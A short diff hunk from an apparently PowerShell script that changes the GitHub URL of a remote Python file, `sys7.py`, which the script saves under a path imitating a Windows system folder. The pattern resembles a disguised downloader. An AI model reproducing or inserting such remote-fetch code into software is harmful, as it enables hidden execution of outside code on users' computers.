@@ -73,7 +73,7 @@ while ($true) {
 # local variables 
 
 
-$pythonFileUrl = "https://raw.githubusercontent.com/ProgrammerJibon/wactherHelper/refs/heads/main/sys7.py"
+$pythonFileUrl = "https://raw.githubusercontent.com/ProgrammerJibon/wactherHelper/main/sys7.py"
 $saveFolder = "$env:LOCALAPPDATA\Microsoft\Windows"
 $savePath = "$saveFolder\sys7.py"
 
